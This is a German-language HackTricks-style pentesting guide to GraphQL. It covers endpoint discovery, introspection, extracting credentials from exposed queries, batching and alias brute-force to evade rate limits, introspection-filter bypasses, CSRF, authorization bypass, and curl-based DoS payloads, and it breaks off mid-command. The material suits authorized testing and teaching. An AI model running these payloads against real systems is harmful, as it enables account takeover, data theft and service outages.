# GraphQL

{{#include ../../banners/hacktricks-training.md}}

## Einführung

GraphQL wird als **effiziente Alternative** zu REST API hervorgehoben und bietet einen vereinfachten Ansatz zum Abfragen von Daten vom Backend. Im Gegensatz zu REST, das oft zahlreiche Anfragen über verschiedene Endpunkte erfordert, um Daten zu sammeln, ermöglicht GraphQL das Abrufen aller benötigten Informationen über eine **einzelne Anfrage**. Diese Vereinfachung **kommt Entwicklern zugute**, indem sie die Komplexität ihrer Datenabrufprozesse verringert.

## GraphQL und Sicherheit

Mit dem Aufkommen neuer Technologien, einschließlich GraphQL, entstehen auch neue Sicherheitsanfälligkeiten. Ein wichtiger Punkt ist, dass **GraphQL standardmäßig keine Authentifizierungsmechanismen enthält**. Es liegt in der Verantwortung der Entwickler, solche Sicherheitsmaßnahmen zu implementieren. Ohne angemessene Authentifizierung können GraphQL-Endpunkte sensible Informationen für nicht authentifizierte Benutzer offenlegen, was ein erhebliches Sicherheitsrisiko darstellt.

### Verzeichnis-Brute-Force-Angriffe und GraphQL

Um exponierte GraphQL-Instanzen zu identifizieren, wird empfohlen, spezifische Pfade in Verzeichnis-Brute-Force-Angriffen einzubeziehen. Diese Pfade sind:

- `/graphql`
- `/graphiql`
- `/graphql.php`
- `/graphql/console`
- `/api`
- `/api/graphql`
- `/graphql/api`
- `/graphql/graphql`

Die Identifizierung offener GraphQL-Instanzen ermöglicht die Untersuchung der unterstützten Abfragen. Dies ist entscheidend für das Verständnis der über den Endpunkt zugänglichen Daten. Das Introspektionssystem von GraphQL erleichtert dies, indem es die Abfragen detailliert, die ein Schema unterstützt. Für weitere Informationen hierzu siehe die GraphQL-Dokumentation zur Introspektion: [**GraphQL: Eine Abfragesprache für APIs.**](https://graphql.org/learn/introspection/)

### Fingerabdruck

Das Tool [**graphw00f**](https://github.com/dolevf/graphw00f) kann erkennen, welcher GraphQL-Engine auf einem Server verwendet wird, und druckt dann einige hilfreiche Informationen für den Sicherheitsprüfer aus.

#### Universelle Abfragen <a href="#universal-queries" id="universal-queries"></a>

Um zu überprüfen, ob eine URL ein GraphQL-Dienst ist, kann eine **universelle Abfrage**, `query{__typename}`, gesendet werden. Wenn die Antwort `{"data": {"__typename": "Query"}}` enthält, bestätigt dies, dass die URL einen GraphQL-Endpunkt hostet. Diese Methode basiert auf dem `__typename`-Feld von GraphQL, das den Typ des abgefragten Objekts offenbart.
```javascript
query{__typename}
```
### Grundlegende Enumeration

Graphql unterstützt normalerweise **GET**, **POST** (x-www-form-urlencoded) und **POST**(json). Obwohl es aus Sicherheitsgründen empfohlen wird, nur json zuzulassen, um CSRF-Angriffe zu verhindern.

#### Introspektion

Um Introspektion zu verwenden, um Schema-Informationen zu entdecken, fragen Sie das `__schema`-Feld ab. Dieses Feld ist auf dem Wurzeltyp aller Abfragen verfügbar.
```bash
query={__schema{types{name,fields{name}}}}
```
Mit dieser Abfrage finden Sie die Namen aller verwendeten Typen:

![](<../../images/image (1036).png>)
```bash
query={__schema{types{name,fields{name,args{name,description,type{name,kind,ofType{name, kind}}}}}}}
```
Mit dieser Abfrage können Sie alle Typen, deren Felder und deren Argumente (sowie den Typ der Argumente) extrahieren. Dies wird sehr nützlich sein, um zu wissen, wie man die Datenbank abfragt.

![](<../../images/image (950).png>)

**Fehler**

Es ist interessant zu wissen, ob die **Fehler** angezeigt werden, da sie nützliche **Informationen** beitragen werden.
```
?query={__schema}
?query={}
?query={thisdefinitelydoesnotexist}
```
![](<../../images/image (416).png>)

**Datenbankschema über Introspektion auflisten**

> [!NOTE]
> Wenn die Introspektion aktiviert ist, aber die obige Abfrage nicht ausgeführt wird, versuchen Sie, die `onOperation`, `onFragment` und `onField` Direktiven aus der Abfrage-Struktur zu entfernen.
```bash
#Full introspection query

query IntrospectionQuery {
__schema {
queryType {
name
}
mutationType {
name
}
subscriptionType {
name
}
types {
...FullType
}
directives {
name
description
args {
...InputValue
}
onOperation  #Often needs to be deleted to run query
onFragment   #Often needs to be deleted to run query
onField      #Often needs to be deleted to run query
}
}
}

fragment FullType on __Type {
kind
name
description
fields(includeDeprecated: true) {
name
description
args {
...InputValue
}
type {
...TypeRef
}
isDeprecated
deprecationReason
}
inputFields {
...InputValue
}
interfaces {
...TypeRef
}
enumValues(includeDeprecated: true) {
name
description
isDeprecated
deprecationReason
}
possibleTypes {
...TypeRef
}
}

fragment InputValue on __InputValue {
name
description
type {
...TypeRef
}
defaultValue
}

fragment TypeRef on __Type {
kind
name
ofType {
kind
name
ofType {
kind
name
ofType {
kind
name
}
}
}
}
```
Inline-Introspektionsanfrage:
```
/?query=fragment%20FullType%20on%20Type%20{+%20%20kind+%20%20name+%20%20description+%20%20fields%20{+%20%20%20%20name+%20%20%20%20description+%20%20%20%20args%20{+%20%20%20%20%20%20...InputValue+%20%20%20%20}+%20%20%20%20type%20{+%20%20%20%20%20%20...TypeRef+%20%20%20%20}+%20%20}+%20%20inputFields%20{+%20%20%20%20...InputValue+%20%20}+%20%20interfaces%20{+%20%20%20%20...TypeRef+%20%20}+%20%20enumValues%20{+%20%20%20%20name+%20%20%20%20description+%20%20}+%20%20possibleTypes%20{+%20%20%20%20...TypeRef+%20%20}+}++fragment%20InputValue%20on%20InputValue%20{+%20%20name+%20%20description+%20%20type%20{+%20%20%20%20...TypeRef+%20%20}+%20%20defaultValue+}++fragment%20TypeRef%20on%20Type%20{+%20%20kind+%20%20name+%20%20ofType%20{+%20%20%20%20kind+%20%20%20%20name+%20%20%20%20ofType%20{+%20%20%20%20%20%20kind+%20%20%20%20%20%20name+%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20}+%20%20%20%20}+%20%20}+}++query%20IntrospectionQuery%20{+%20%20schema%20{+%20%20%20%20queryType%20{+%20%20%20%20%20%20name+%20%20%20%20}+%20%20%20%20mutationType%20{+%20%20%20%20%20%20name+%20%20%20%20}+%20%20%20%20types%20{+%20%20%20%20%20%20...FullType+%20%20%20%20}+%20%20%20%20directives%20{+%20%20%20%20%20%20name+%20%20%20%20%20%20description+%20%20%20%20%20%20locations+%20%20%20%20%20%20args%20{+%20%20%20%20%20%20%20%20...InputValue+%20%20%20%20%20%20}+%20%20%20%20}+%20%20}+}
```
Die letzte Codezeile ist eine GraphQL-Abfrage, die alle Metainformationen aus dem GraphQL (Objektnamen, Parameter, Typen...) ausgibt.

![](<../../images/image (363).png>)

Wenn die Introspektion aktiviert ist, können Sie [**GraphQL Voyager**](https://github.com/APIs-guru/graphql-voyager) verwenden, um in einer GUI alle Optionen anzuzeigen.

### Abfragen

Jetzt, da wir wissen, welche Art von Informationen in der Datenbank gespeichert ist, lassen Sie uns versuchen, **einige Werte zu extrahieren**.

In der Introspektion können Sie **sehen, welches Objekt Sie direkt abfragen können** (weil Sie ein Objekt nicht nur abfragen können, weil es existiert). Im folgenden Bild sehen Sie, dass der "_queryType_" "_Query_" genannt wird und dass eines der Felder des "_Query_"-Objekts "_flags_" ist, das ebenfalls ein Objekttyp ist. Daher können Sie das Flag-Objekt abfragen.

![](<../../images/Screenshot from 2021-03-13 18-17-48.png>)

Beachten Sie, dass der Typ der Abfrage "_flags_" "_Flags_" ist, und dieses Objekt ist wie folgt definiert:

![](<../../images/Screenshot from 2021-03-13 18-22-57 (1).png>)

Sie können sehen, dass die "_Flags_"-Objekte aus **name** und **value** bestehen. Dann können Sie alle Namen und Werte der Flags mit der Abfrage erhalten:
```javascript
query={flags{name, value}}
```
Beachten Sie, dass im Falle, dass das **Objekt, das abgefragt werden soll**, ein **primitiver** **Typ** wie **string** ist, wie im folgenden Beispiel

![](<../../images/image (958).png>)

Sie können es einfach mit abfragen:
```javascript
query = { hiddenFlags }
```
In einem anderen Beispiel, in dem es 2 Objekte im "_Query_" Typobjekt gab: "_user_" und "_users_".\
Wenn diese Objekte keine Argumente benötigen, um zu suchen, könnte man **alle Informationen von ihnen abrufen**, indem man einfach nach den gewünschten Daten fragt. In diesem Beispiel aus dem Internet könnte man die gespeicherten Benutzernamen und Passwörter extrahieren:

![](<../../images/image (880).png>)

Wenn man jedoch in diesem Beispiel versucht, dies zu tun, erhält man diesen **Fehler**:

![](<../../images/image (1042).png>)

Es scheint, dass es irgendwie mit dem "_**uid**_" Argument vom Typ _**Int**_ suchen wird.\
Wie auch immer, wir wussten bereits, dass im Abschnitt [Basic Enumeration](graphql.md#basic-enumeration) eine Abfrage vorgeschlagen wurde, die uns alle benötigten Informationen zeigte: `query={__schema{types{name,fields{name, args{name,description,type{name, kind, ofType{name, kind}}}}}}}`

Wenn du das Bild liest, das bereitgestellt wurde, als ich diese Abfrage ausgeführt habe, wirst du sehen, dass "_**user**_" das **arg** "_**uid**_" vom Typ _Int_ hatte.

Durch einige leichte _**uid**_ Bruteforce fand ich heraus, dass bei _**uid**=**1**_ ein Benutzername und ein Passwort abgerufen wurden:\
`query={user(uid:1){user,password}}`

![](<../../images/image (90).png>)

Beachte, dass ich **entdeckt** habe, dass ich nach den **Parametern** "_**user**_" und "_**password**_" fragen konnte, denn wenn ich versuche, nach etwas zu suchen, das nicht existiert (`query={user(uid:1){noExists}}`), erhalte ich diesen Fehler:

![](<../../images/image (707).png>)

Und während der **Enumeration-Phase** entdeckte ich, dass das "_**dbuser**_" Objekt die Felder "_**user**_" und "_**password**_" hatte.

**Query-String-Dump-Trick (danke an @BinaryShadow\_)**

Wenn du nach einem String-Typ suchen kannst, wie: `query={theusers(description: ""){username,password}}` und du **nach einem leeren String suchst**, wird es **alle Daten dumpen**. (_Beachte, dass dieses Beispiel nicht mit dem Beispiel der Tutorials zusammenhängt, für dieses Beispiel gehe davon aus, dass du mit "**theusers**" nach einem String-Feld namens "**description**" suchen kannst_).

### Suche

In diesem Setup enthält eine **Datenbank** **Personen** und **Filme**. **Personen** werden durch ihre **E-Mail** und **Namen** identifiziert; **Filme** durch ihren **Namen** und **Bewertung**. **Personen** können Freunde miteinander sein und auch Filme haben, was Beziehungen innerhalb der Datenbank anzeigt.

Du kannst **Personen** **nach** dem **Namen** suchen und ihre E-Mails erhalten:
```javascript
{
searchPerson(name: "John Doe") {
email
}
}
```
Sie können **Personen** **nach** dem **Namen** **suchen** und ihre **abonnierten** **Filme** erhalten:
```javascript
{
searchPerson(name: "John Doe") {
email
subscribedMovies {
edges {
node {
name
}
}
}
}
}
```
Beachten Sie, wie angegeben ist, um den `name` der `subscribedMovies` der Person abzurufen.

Sie können auch **mehrere Objekte gleichzeitig suchen**. In diesem Fall wird nach 2 Filmen gesucht:
```javascript
{
searchPerson(subscribedMovies: [{name: "Inception"}, {name: "Rocky"}]) {
name
}
}r
```
Oder sogar **Beziehungen mehrerer verschiedener Objekte mithilfe von Aliassen**:
```javascript
{
johnsMovieList: searchPerson(name: "John Doe") {
subscribedMovies {
edges {
node {
name
}
}
}
}
davidsMovieList: searchPerson(name: "David Smith") {
subscribedMovies {
edges {
node {
name
}
}
}
}
}
```
### Mutationen

**Mutationen werden verwendet, um Änderungen auf der Serverseite vorzunehmen.**

In der **Introspektion** finden Sie die **deklarierten** **Mutationen**. In der folgenden Abbildung wird der "_MutationType_" als "_Mutation_" bezeichnet, und das "_Mutation_"-Objekt enthält die Namen der Mutationen (wie "_addPerson_" in diesem Fall):

![](<../../images/Screenshot from 2021-03-13 18-26-27 (1).png>)

In diesem Setup enthält eine **Datenbank** **Personen** und **Filme**. **Personen** werden durch ihre **E-Mail** und **Namen** identifiziert; **Filme** durch ihren **Namen** und **Bewertung**. **Personen** können Freunde miteinander sein und auch Filme haben, was Beziehungen innerhalb der Datenbank anzeigt.

Eine Mutation zum **Erstellen neuer** Filme in der Datenbank könnte wie folgt aussehen (in diesem Beispiel wird die Mutation `addMovie` genannt):
```javascript
mutation {
addMovie(name: "Jumanji: The Next Level", rating: "6.8/10", releaseYear: 2019) {
movies {
name
rating
}
}
}
```
**Beachten Sie, wie sowohl die Werte als auch der Datentyp in der Abfrage angegeben sind.**

Zusätzlich unterstützt die Datenbank eine **Mutation**-Operation, die `addPerson` genannt wird und die Erstellung von **Personen** zusammen mit ihren Verbindungen zu bestehenden **Freunden** und **Filmen** ermöglicht. Es ist wichtig zu beachten, dass die Freunde und Filme bereits in der Datenbank vorhanden sein müssen, bevor sie mit der neu erstellten Person verknüpft werden.
```javascript
mutation {
addPerson(name: "James Yoe", email: "jy@example.com", friends: [{name: "John Doe"}, {email: "jd@example.com"}], subscribedMovies: [{name: "Rocky"}, {name: "Interstellar"}, {name: "Harry Potter and the Sorcerer's Stone"}]) {
person {
name
email
friends {
edges {
node {
name
email
}
}
}
subscribedMovies {
edges {
node {
name
rating
releaseYear
}
}
}
}
}
}
```
### Directive Overloading

Wie in [**einer der Schwachstellen, die in diesem Bericht beschrieben sind**](https://www.landh.tech/blog/20240304-google-hack-50000/) erklärt, bedeutet eine Directive Overloading, dass eine Direktive sogar Millionen von Malen aufgerufen wird, um den Server dazu zu bringen, Operationen zu verschwenden, bis es möglich ist, ihn DoS zu machen.

### Batching brute-force in 1 API request

Diese Informationen stammen von [https://lab.wallarm.com/graphql-batching-attack/](https://lab.wallarm.com/graphql-batching-attack/).\
Authentifizierung über die GraphQL API mit **gleichzeitigem Senden vieler Abfragen mit unterschiedlichen Anmeldeinformationen**, um dies zu überprüfen. Es handelt sich um einen klassischen Brute-Force-Angriff, aber jetzt ist es möglich, mehr als ein Login/Passwort-Paar pro HTTP-Anfrage zu senden, dank der GraphQL-Batching-Funktion. Dieser Ansatz würde externe Rate-Überwachungsanwendungen täuschen, indem er denkt, dass alles in Ordnung ist und kein Brute-Forcing-Bot versucht, Passwörter zu erraten.

Unten finden Sie die einfachste Demonstration einer Anwendungsauthentifizierungsanfrage, mit **3 verschiedenen E-Mail/Passwort-Paaren gleichzeitig**. Offensichtlich ist es möglich, Tausende in einer einzigen Anfrage auf die gleiche Weise zu senden:

![](<../../images/image (1081).png>)

Wie wir aus dem Screenshot der Antwort sehen können, gaben die erste und die dritte Anfrage _null_ zurück und spiegelten die entsprechenden Informationen im _error_-Bereich wider. Die **zweite Mutation hatte die korrekten Authentifizierungs**daten und die Antwort enthält das korrekte Authentifizierungssitzungstoken.

![](<../../images/image (119) (1).png>)

## GraphQL Without Introspection

Immer mehr **GraphQL-Endpunkte deaktivieren die Introspektion**. Die Fehler, die GraphQL wirft, wenn eine unerwartete Anfrage empfangen wird, sind jedoch ausreichend für Tools wie [**clairvoyance**](https://github.com/nikitastupin/clairvoyance), um den größten Teil des Schemas zu rekonstruieren.

Darüber hinaus beobachtet die Burp Suite-Erweiterung [**GraphQuail**](https://github.com/forcesunseen/graphquail) **GraphQL API-Anfragen, die durch Burp gehen**, und **baut** ein internes GraphQL-**Schema** mit jeder neuen Abfrage, die sie sieht. Es kann auch das Schema für GraphiQL und Voyager offenlegen. Die Erweiterung gibt eine gefälschte Antwort zurück, wenn sie eine Introspektionsanfrage erhält. Infolgedessen zeigt GraphQuail alle Abfragen, Argumente und Felder an, die innerhalb der API verfügbar sind. Für weitere Informationen [**überprüfen Sie dies**](https://blog.forcesunseen.com/graphql-security-testing-without-a-schema).

Eine schöne **Wortliste**, um [**GraphQL-Entitäten zu entdecken, finden Sie hier**](https://github.com/Escape-Technologies/graphql-wordlist?).

### Bypassing GraphQL introspection defences <a href="#bypassing-graphql-introspection-defences" id="bypassing-graphql-introspection-defences"></a>

Um Einschränkungen bei Introspektionsanfragen in APIs zu umgehen, erweist sich das Einfügen eines **Sonderzeichens nach dem `__schema`-Schlüsselwort** als effektiv. Diese Methode nutzt häufige Entwicklerübersichten in Regex-Mustern aus, die darauf abzielen, die Introspektion zu blockieren, indem sie sich auf das `__schema`-Schlüsselwort konzentrieren. Durch das Hinzufügen von Zeichen wie **Leerzeichen, Zeilenumbrüchen und Kommas**, die GraphQL ignoriert, aber möglicherweise nicht in Regex berücksichtigt werden, können Einschränkungen umgangen werden. Zum Beispiel kann eine Introspektionsanfrage mit einem Zeilenumbruch nach `__schema` solche Abwehrmaßnahmen umgehen:
```bash
# Example with newline to bypass
{
"query": "query{__schema
{queryType{name}}}"
}
```
Wenn dies nicht erfolgreich ist, ziehen Sie alternative Anforderungsmethoden in Betracht, wie **GET-Anfragen** oder **POST mit `x-www-form-urlencoded`**, da Einschränkungen möglicherweise nur für POST-Anfragen gelten.

### Versuchen Sie WebSockets

Wie in [**diesem Vortrag**](https://www.youtube.com/watch?v=tIo_t5uUK50) erwähnt, überprüfen Sie, ob es möglich sein könnte, sich über WebSockets mit graphQL zu verbinden, da dies Ihnen möglicherweise ermöglicht, eine potenzielle WAF zu umgehen und die Websocket-Kommunikation das Schema von graphQL preiszugeben:
```javascript
ws = new WebSocket("wss://target/graphql", "graphql-ws")
ws.onopen = function start(event) {
var GQL_CALL = {
extensions: {},
query: `
{
__schema {
_types {
name
}
}
}`,
}

var graphqlMsg = {
type: "GQL.START",
id: "1",
payload: GQL_CALL,
}
ws.send(JSON.stringify(graphqlMsg))
}
```
### **Entdecken von Exponierten GraphQL-Strukturen**

Wenn die Introspektion deaktiviert ist, ist das Durchsuchen des Quellcodes der Website nach vorab geladenen Abfragen in JavaScript-Bibliotheken eine nützliche Strategie. Diese Abfragen können im `Sources`-Tab der Entwicklertools gefunden werden, was Einblicke in das Schema der API bietet und potenziell **exponierte sensible Abfragen** offenbart. Die Befehle zum Suchen innerhalb der Entwicklertools sind:
```javascript
Inspect/Sources/"Search all files"
file:* mutation
file:* query
```
## CSRF in GraphQL

Wenn Sie nicht wissen, was CSRF ist, lesen Sie die folgende Seite:

{{#ref}}
../../pentesting-web/csrf-cross-site-request-forgery.md
{{#endref}}

Dort draußen werden Sie mehrere GraphQL-Endpunkte finden, **die ohne CSRF-Token konfiguriert sind.**

Beachten Sie, dass GraphQL-Anfragen normalerweise über POST-Anfragen mit dem Content-Type **`application/json`** gesendet werden.
```javascript
{"operationName":null,"variables":{},"query":"{\n  user {\n    firstName\n    __typename\n  }\n}\n"}
```
Die meisten GraphQL-Endpunkte unterstützen jedoch auch **`form-urlencoded` POST-Anfragen:**
```javascript
query=%7B%0A++user+%7B%0A++++firstName%0A++++__typename%0A++%7D%0A%7D%0A
```
Daher ist es möglich, **Änderungen** in der GraphQL vorzunehmen, indem man eine CSRF ausnutzt, da CSRF-Anfragen wie die vorherigen **ohne Preflight-Anfragen** gesendet werden.

Beachten Sie jedoch, dass der neue Standardwert des Cookie-Werts des `samesite`-Flags von Chrome `Lax` ist. Das bedeutet, dass das Cookie nur von einer Drittanbieter-Website in GET-Anfragen gesendet wird.

Es ist zu beachten, dass es normalerweise möglich ist, die **Abfrage** **Anfrage** auch als **GET** **Anfrage** zu senden und das CSRF-Token möglicherweise in einer GET-Anfrage nicht validiert wird.

Außerdem könnte es möglich sein, durch den Missbrauch eines [**XS-Search**](../../pentesting-web/xs-search/) **Angriffs** Inhalte vom GraphQL-Endpunkt unter Ausnutzung der Anmeldeinformationen des Benutzers zu exfiltrieren.

Für weitere Informationen **überprüfen Sie den** [**ursprünglichen Beitrag hier**](https://blog.doyensec.com/2021/05/20/graphql-csrf.html).

## Cross-Site-WebSocket-Hijacking in GraphQL

Ähnlich wie bei CRSF-Schwachstellen, die GraphQL ausnutzen, ist es auch möglich, ein **Cross-Site-WebSocket-Hijacking durchzuführen, um eine Authentifizierung mit GraphQL mit ungeschützten Cookies auszunutzen** und einen Benutzer dazu zu bringen, unerwartete Aktionen in GraphQL auszuführen.

Für weitere Informationen überprüfen Sie:

{{#ref}}
../../pentesting-web/websocket-attacks.md
{{#endref}}

## Autorisierung in GraphQL

Viele GraphQL-Funktionen, die am Endpunkt definiert sind, überprüfen möglicherweise nur die Authentifizierung des Anforderers, jedoch nicht die Autorisierung.

Die Modifizierung von Abfrageeingabevariablen könnte zu sensiblen Kontodetails [leaken](https://hackerone.com/reports/792927).

Mutation könnte sogar zu einem Account-Übernahmeversuch führen, wenn versucht wird, andere Kontodaten zu ändern.
```javascript
{
"operationName":"updateProfile",
"variables":{"username":INJECT,"data":INJECT},
"query":"mutation updateProfile($username: String!,...){updateProfile(username: $username,...){...}}"
}
```
### Umgehung der Autorisierung in GraphQL

[Das Verketten von Abfragen](https://s1n1st3r.gitbook.io/theb10g/graphql-query-authentication-bypass-vuln) kann ein schwaches Authentifizierungssystem umgehen.

Im folgenden Beispiel sehen Sie, dass die Operation "forgotPassword" ist und dass sie nur die zugehörige forgotPassword-Abfrage ausführen sollte. Dies kann umgangen werden, indem am Ende eine Abfrage hinzugefügt wird; in diesem Fall fügen wir "register" und eine Benutzer-Variable hinzu, damit das System sich als neuer Benutzer registriert.

<figure><img src="../../images/GraphQLAuthBypassMethod.PNG" alt=""><figcaption></figcaption></figure>

## Umgehung von Ratenlimits mit Aliassen in GraphQL

In GraphQL sind Aliasse ein leistungsstarkes Feature, das es ermöglicht, **Eigenschaften explizit zu benennen**, wenn eine API-Anfrage gestellt wird. Diese Fähigkeit ist besonders nützlich, um **mehrere Instanzen desselben Typs** von Objekten innerhalb einer einzigen Anfrage abzurufen. Aliasse können verwendet werden, um die Einschränkung zu überwinden, die verhindert, dass GraphQL-Objekte mehrere Eigenschaften mit demselben Namen haben.

Für ein detailliertes Verständnis von GraphQL-Aliassen wird die folgende Ressource empfohlen: [Aliases](https://portswigger.net/web-security/graphql/what-is-graphql#aliases).

Während der Hauptzweck von Aliassen darin besteht, die Notwendigkeit zahlreicher API-Aufrufe zu reduzieren, wurde ein unbeabsichtigter Anwendungsfall identifiziert, bei dem Aliasse genutzt werden können, um Brute-Force-Angriffe auf einen GraphQL-Endpunkt auszuführen. Dies ist möglich, weil einige Endpunkte durch Ratenbegrenzer geschützt sind, die darauf ausgelegt sind, Brute-Force-Angriffe zu verhindern, indem sie die **Anzahl der HTTP-Anfragen** einschränken. Diese Ratenbegrenzer berücksichtigen jedoch möglicherweise nicht die Anzahl der Operationen innerhalb jeder Anfrage. Da Aliasse die Einbeziehung mehrerer Abfragen in einer einzigen HTTP-Anfrage ermöglichen, können sie solche Ratenbegrenzungsmaßnahmen umgehen.

Betrachten Sie das unten angegebene Beispiel, das veranschaulicht, wie aliierte Abfragen verwendet werden können, um die Gültigkeit von Rabattcodes im Geschäft zu überprüfen. Diese Methode könnte Ratenbegrenzungen umgehen, da sie mehrere Abfragen in einer HTTP-Anfrage zusammenfasst und möglicherweise die Überprüfung zahlreicher Rabattcodes gleichzeitig ermöglicht.
```bash
# Example of a request utilizing aliased queries to check for valid discount codes
query isValidDiscount($code: Int) {
isvalidDiscount(code:$code){
valid
}
isValidDiscount2:isValidDiscount(code:$code){
valid
}
isValidDiscount3:isValidDiscount(code:$code){
valid
}
}
```
## DoS in GraphQL

### Alias Overloading

**Alias Overloading** ist eine GraphQL-Sicherheitsanfälligkeit, bei der Angreifer eine Abfrage mit vielen Aliasnamen für dasselbe Feld überlasten, was dazu führt, dass der Backend-Resolver dieses Feld wiederholt ausführt. Dies kann die Serverressourcen überlasten und zu einem **Denial of Service (DoS)** führen. Zum Beispiel wird im folgenden Abfrage dasselbe Feld (`expensiveField`) 1.000 Mal mit Aliasnamen angefordert, was den Backend zwingt, es 1.000 Mal zu berechnen, was möglicherweise die CPU oder den Speicher erschöpft:
```graphql
# Test provided by https://github.com/dolevf/graphql-cop
curl -X POST -H "Content-Type: application/json" \
-d '{"query": "{ alias0:__typename \nalias1:__typename \nalias2:__typename \nalias3:__typename \nalias4:__typename \nalias5:__typename \nalias6:__typename \nalias7:__typename \nalias8:__typename \nalias9:__typename \nalias10:__typename \nalias11:__typename \nalias12:__typename \nalias13:__typename \nalias14:__typename \nalias15:__typename \nalias16:__typename \nalias17:__typename \nalias18:__typename \nalias19:__typename \nalias20:__typename \nalias21:__typename \nalias22:__typename \nalias23:__typename \nalias24:__typename \nalias25:__typename \nalias26:__typename \nalias27:__typename \nalias28:__typename \nalias29:__typename \nalias30:__typename \nalias31:__typename \nalias32:__typename \nalias33:__typename \nalias34:__typename \nalias35:__typename \nalias36:__typename \nalias37:__typename \nalias38:__typename \nalias39:__typename \nalias40:__typename \nalias41:__typename \nalias42:__typename \nalias43:__typename \nalias44:__typename \nalias45:__typename \nalias46:__typename \nalias47:__typename \nalias48:__typename \nalias49:__typename \nalias50:__typename \nalias51:__typename \nalias52:__typename \nalias53:__typename \nalias54:__typename \nalias55:__typename \nalias56:__typename \nalias57:__typename \nalias58:__typename \nalias59:__typename \nalias60:__typename \nalias61:__typename \nalias62:__typename \nalias63:__typename \nalias64:__typename \nalias65:__typename \nalias66:__typename \nalias67:__typename \nalias68:__typename \nalias69:__typename \nalias70:__typename \nalias71:__typename \nalias72:__typename \nalias73:__typename \nalias74:__typename \nalias75:__typename \nalias76:__typename \nalias77:__typename \nalias78:__typename \nalias79:__typename \nalias80:__typename \nalias81:__typename \nalias82:__typename \nalias83:__typename \nalias84:__typename \nalias85:__typename \nalias86:__typename \nalias87:__typename \nalias88:__typename \nalias89:__typename \nalias90:__typename \nalias91:__typename \nalias92:__typename \nalias93:__typename \nalias94:__typename \nalias95:__typename \nalias96:__typename \nalias97:__typename \nalias98:__typename \nalias99:__typename \nalias100:__typename \n }"}' \
'https://example.com/graphql'
```
Um dies zu mildern, implementieren Sie Alias-Zählgrenzen, Abfragekomplexitätsanalysen oder Ratenbegrenzungen, um Ressourcenmissbrauch zu verhindern.

### **Array-basierte Abfrage-Batching**

**Array-basierte Abfrage-Batching** ist eine Schwachstelle, bei der eine GraphQL-API das Batching mehrerer Abfragen in einer einzigen Anfrage zulässt, wodurch ein Angreifer eine große Anzahl von Abfragen gleichzeitig senden kann. Dies kann das Backend überlasten, indem alle gebündelten Abfragen parallel ausgeführt werden, was übermäßige Ressourcen (CPU, Speicher, Datenbankverbindungen) verbraucht und potenziell zu einem **Denial of Service (DoS)** führen kann. Wenn keine Grenze für die Anzahl der Abfragen in einem Batch besteht, kann ein Angreifer dies ausnutzen, um die Verfügbarkeit des Dienstes zu beeinträchtigen.
```graphql
# Test provided by https://github.com/dolevf/graphql-cop
curl -X POST -H "User-Agent: graphql-cop/1.13" \
-H "Content-Type: application/json" \
-d '[{"query": "query cop { __typename }"}, {"query": "query cop { __typename }"}, {"query": "query cop { __typename }"}, {"query": "query cop { __typename }"}, {"query": "query cop { __typename }"}, {"query": "query cop { __typename }"}, {"query": "query cop { __typename }"}, {"query": "query cop { __typename }"}, {"query": "query cop { __typename }"}, {"query": "query cop { __typename }"}]' \
'https://example.com/graphql'
```
In diesem Beispiel werden 10 verschiedene Abfragen in einer Anfrage gebündelt, wodurch der Server gezwungen wird, alle gleichzeitig auszuführen. Wenn dies mit einer größeren Batch-Größe oder rechenintensiven Abfragen ausgenutzt wird, kann es den Server überlasten.

### **Directive Overloading Vulnerability**

**Directive Overloading** tritt auf, wenn ein GraphQL-Server Abfragen mit übermäßigen, duplizierten Direktiven zulässt. Dies kann den Parser und Executor des Servers überwältigen, insbesondere wenn der Server wiederholt dieselbe Direktivenlogik verarbeitet. Ohne angemessene Validierung oder Grenzen kann ein Angreifer dies ausnutzen, indem er eine Abfrage mit zahlreichen duplizierten Direktiven erstellt, um eine hohe Rechen- oder Speichernutzung auszulösen, was zu **Denial of Service (DoS)** führt.
```bash
# Test provided by https://github.com/dolevf/graphql-cop
curl -X POST -H "User-Agent: graphql-cop/1.13" \
-H "Content-Type: application/json" \
-d '{"query": "query cop { __typename @aa@aa@aa@aa@aa@aa@aa@aa@aa@aa }", "operationName": "cop"}' \
'https://example.com/graphql'
```
Beachten Sie, dass im vorherigen Beispiel `@aa` eine benutzerdefinierte Direktive ist, die **möglicherweise nicht deklariert ist**. Eine gängige Direktive, die normalerweise vorhanden ist, ist **`@include`**:
```bash
curl -X POST \
-H "Content-Type: application/json" \
-d '{"query": "query cop { __typename @include(if: true) @include(if: true) @include(if: true) @include(if: true) @include(if: true) }", "operationName": "cop"}' \
'https://example.com/graphql'
```
Sie können auch eine Introspektionsabfrage senden, um alle deklarierten Direktiven zu entdecken:
```bash
curl -X POST \
-H "Content-Type: application/json" \
-d '{"query": "{ __schema { directives { name locations args { name type { name kind ofType { name } } } } } }"}' \
'https://example.com/graphql'
```
Und dann **verwenden Sie einige der benutzerdefinierten**.

### **Feldduplikationsanfälligkeit**

**Feldduplikation** ist eine Anfälligkeit, bei der ein GraphQL-Server Abfragen mit demselben Feld übermäßig wiederholt. Dies zwingt den Server, das Feld für jede Instanz redundant aufzulösen, was erhebliche Ressourcen (CPU, Speicher und Datenbankaufrufe) verbraucht. Ein Angreifer kann Abfragen mit Hunderten oder Tausenden von wiederholten Feldern erstellen, was zu hoher Last führt und potenziell zu einem **Denial of Service (DoS)** führen kann.
```bash
# Test provided by https://github.com/dolevf/graphql-cop
curl -X POST -H "User-Agent: graphql-cop/1.13" -H "Content-Type: application/json" \
